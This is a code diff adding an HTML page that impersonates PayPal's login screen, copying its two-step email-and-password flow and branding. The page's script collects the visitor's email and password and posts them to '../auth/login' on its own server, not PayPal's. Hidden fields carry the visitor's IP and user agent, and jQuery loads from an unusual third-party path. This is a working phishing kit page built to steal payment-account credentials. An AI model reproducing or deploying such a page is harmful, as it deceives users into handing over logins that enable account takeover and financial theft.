@@ -1,0 +1,260 @@
+<html>
+<head>
+<meta charset="utf-8">
+<title>Log in to your PayPal account</title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="application-name" content="">
+<meta name="msapplication-task" content="">
+<meta name="msapplication-task" content="">
+<meta name="keywords" content="">
+<meta name="description" content="">
+<link rel="shortcut icon" href="../img/pp_favicon_x.ico">
+<link rel="apple-touch-icon" href="../img/pp64.png">
+<link rel="canonical" href="">
+<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
+<meta property="og:image" content="img/pp258.png">
+<link rel="stylesheet" href="../css/contextualLoginElementalUIv2.css">
+<link rel="stylesheet" href="../css/paypal.css">
+</head>
+<body class="desktop">
+<div id="main" class="main" role="main">
+  <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
+  <div class="corral ">
+    <div id="content" class="contentContainer activeContent contentContainerBordered">
+      <header id="header">
+      <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
+      </header>
+      <h1 id="headerText" class="headerText accessAid">Log in to your PayPal account</h1>
+      <div id="loginContent" class="">
+        <div id="loginSection" class="">
+          <div class="notifications">
+            <p class="notification notification-critical" id="error" style="display: none;" role="alert">Some of your info isn't correct. Please try again.</p>
+          </div>
+          <div id="keychainErrorMessage" class="hide">
+            <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
+            <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
+            <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
+          </div>
+          <form action="javascript:void(0)" method="post" class="proceed maskable" id="form">
+            <div style="display: none;" id="changeEmail">
+              <div class="profileDisplayName show"></div>
+              <div class="profileRememberedEmail show ">
+                <span class="profileDisplayPhoneCode" dir="ltr"></span>
+                <span class="profileDisplayEmail notranslate" id="emailText"></span>
+                <a href="javascript:void(0)" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Change</a>
+              </div>
+            </div>
+            <!-- Login 1 -->
+            <div id="splitEmail" class="splitEmail " style="display: block;">
+              <div id="splitEmailSection" class="splitPhoneSection splitEmailSection ">
+                <div class="textInput " id="login_emaildiv" style="z-index: 100%;">
+                  <div class="fieldWrapper">
+                    <input id="email" name="email" type="email" class="hasHelp validateEmpty " required value="" placeholder="Email or mobile number" aria-describedby="emailErrorMessage">
+                    <label for="email" class="fieldLabel">Email or mobile number</label>
+                  </div>
+                </div>
+              </div>
+              <div class="actions">
+                <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="button" id="btnNext" pa-marked="1">Next</button>
+              </div>
+            </div>
+            <!-- Login 2 -->
+            <div id="login2" style="display: none;">
+              <div id="splitPassword" class="splitPassword show">
+                <div id="splitPasswordSection" class="show ">
+                  <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
+                    <div class="textInput " id="login_passworddiv" style="z-index: 100%;">
+                      <div class="fieldWrapper">
+                        <input id="password" name="password" type="password" class="hasHelp validateEmpty pin-password" required="required" value="" placeholder="Password">
+                        <label for="password" class="fieldLabel">Password</label>
+                        <label for="showPassword" class="fieldLabel">Show password</label>
+                        <button onclick="showpw1()" type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="showPassword" pa-marked="1">Show</button>
+                        <label for="Hide" class="fieldLabel">Hide</label>
+                        <button onclick="showpw1()" type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide" pa-marked="1">Hide</button>
+                      </div>
+                    </div>
+                    <a id="forgotPassword" class="recoveryOption forgotPassword" data-client-log-action-type="clickForgotPasswordLink" pa-marked="1">Forgot password?</a>
+                  </div>
+                </div>
+                <input type="hidden" name="ip" value="118.70.31.97">
+                <input type="hidden" name="ua" value="python-requests/2.31.0">
+                <input type="hidden" name="login" value="PayPal">
+                <div class="actions">
+                  <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" pa-marked="1">Log In</button>
+                </div>
+              </div>
+            </div>
+          </form>
+          <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
+            <div class="loginSignUpSeparator ">
+              <span class="textInSeparator">or</span>
+            </div>
+            <button type="button" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</button>
+          </div>
+        </div>
+      </div>
+      <div class="intentFooter ">
+        <div class="localeSelector ">
+          <span class="picker country-selector">
+            <button type="button" aria-labelledby="countryPickerLink" class="country VN" pa-marked="1"></button>
+          </span>
+        </div>
+      </div>
+    </div>
+  </div>
+  </section>
+  <footer class="footer" role="contentinfo">
+    <div class="legalFooter">
+      <ul class="footerGroup">
+        <li>
+          <a pa-marked="1">Contact Us</a>
+        </li>
+        <li>
+          <a pa-marked="1">Privacy</a>
+        </li>
+        <li>
+          <a pa-marked="1">Legal</a>
+        </li>
+        <li>
+          <a pa-marked="1">Policy Updates</a>
+        </li>
+        <li>
+          <a pa-marked="1">Worldwide</a>
+        </li>
+      </ul>
+    </div>
+  </footer>
+</div>
+<div style="display: none;" id="loading">
+  <div class="transitioning spinner" aria-busy="false">
+    <p class="welcomeMessage hide">Welcome, !</p>
+    <p class="checkingInfo hide">Checking your info…</p>
+    <p class="oneSecond hide">Just a second…</p>
+    <p class="secureMessage hide">Securely logging you in...</p>
+    <p class="oneTouchMessage hide"></p>
+    <p class="retrieveInfo hide">Retrieving your info...</p>
+    <p class="waitFewSecs hide">This may take a few seconds...</p>
+    <p class="udtSpinnerMessage udtLogin hide">
+      We recognize you on this device, and we’re securely logging you in.    </p>
+    <p class="udtSpinnerMessage udtLoginXo hide">
+      We recognize you on this device, so no need to enter your password for this purchase.    </p>
+    <p class="udtSpinnerMessage webllsXoUS hide">
+      We recognize you on this device, so you can skip login.<br>
+      <br>Manage this setting in your profile.</p>
+    <p class="udtSpinnerMessage webllsSCA hide">
+      We're taking you to PayPal Checkout to complete payment.    </p>
+    <p class="qrcMessage hide">Redirecting...</p>
+    <p class="webAuthnOptin hide">Updating your login settings...</p>
+    <p class="webAuthnLogin hide">Logging you in...</p>
+    <div class="keychain spinner-content uiExp hide"></div>
+  </div>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/cdnlib/jquery-3.6.4/jquery.min.js"></script>
+<script src="../js/jquery.mask.min.js"></script>
+<script type="text/javascript">
+function showpw1() {
+  var x = document.getElementById("password");
+  if (x.type === "password") {
+    x.type = "text";
+    $("#showPassword").addClass("hide");
+    $("#Hide").removeClass("hide");
+  }else{
+    x.type = "password";
+    $("#Hide").addClass("hide");
+    $("#showPassword").removeClass("hide");
+  }
+}
+$(document).ready(function(){
+  $("#backToInputEmailLink").click(function() {
+    document.getElementById("loading").style.display = "block";
+    let tID = setTimeout(function () {
+      document.getElementById("splitEmail").style.display = "block";
+      document.getElementById("changeEmail").style.display = "none";
+      document.getElementById("login2").style.display = "none";
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("error").style.display = "none";
+      window.clearTimeout(tID);
+    }, 1000);
+  });
+  $("#password").keyup(function() {
+    var password = $("#password").val();
+    var x = document.getElementById("password");
+    if (password == "") {
+      $("#showPassword").addClass("hide");
+      $("#Hide").addClass("hide");
+    }else{
+      if (x.type === "password") {
+        $("#showPassword").removeClass("hide");
+        $("#Hide").addClass("hide");
+      }else{
+        $("#Hide").removeClass("hide");
+        $("#showPassword").addClass("hide");
+      }
+    }
+  });
+  $("#btnNext").click(function() {
+      var email = $("#email").val();
+      if (email == "") {
+        $("#login_emaildiv").addClass('hasError');
+      }else{
+        document.getElementById("loading").style.display = "block";
+        $.ajax({
+            url: '../auth/validateMail',
+            data: 'email='+email,
+            type: 'POST',
+            dataType: 'html',
+            success: function(msg) {
+              const json = JSON.parse(msg);
+              if (json.status == false) {
+                let tID = setTimeout(function () {
+                  document.getElementById("loading").style.display = "none";
+                  $("#login_emaildiv").addClass('hasError');
+                  window.clearTimeout(tID);
+                }, 1000);
+              }
+              if (json.status == true) {
+                  let tID = setTimeout(function () {
+                    document.getElementById("splitEmail").style.display = "none";
+                    $('#emailText').html(email);
+                    document.getElementById("changeEmail").style.display = "block";
+                    document.getElementById("login2").style.display = "block";
+                    document.getElementById("loading").style.display = "none";
+                    window.clearTimeout(tID);
+                  }, 1000);
+              }
+            }
+        });
+      }
+  });
+
+  $("#form").submit(function() {
+      var email = $("#email").val();
+      var password = $("#password").val();
+      if (email == ""||password == "") {
+        $("#login_passworddiv").addClass('hasError');
+      }else{
+        maskingForm();
+        document.getElementById("loading").style.display = "block";
+        $.ajax({
+            url: '../auth/login',
+            data: 'email='+email+'&password='+password,
+            type: 'POST',
+            dataType: 'html',
+            success: function(msg) {
+              const json = JSON.parse(msg);
+              if (json.status == false) {
+                document.getElementById("loading").style.display = "none";
+                document.getElementById("error").style.display = "block";
+              }
+              if (json.status == true) {
+                location.reload();
+              }
+            }
+        });
+      }
+  });
+});
+</script>
+<script src="../assets/js/disable.js" defer></script>
+</body>
+</html>
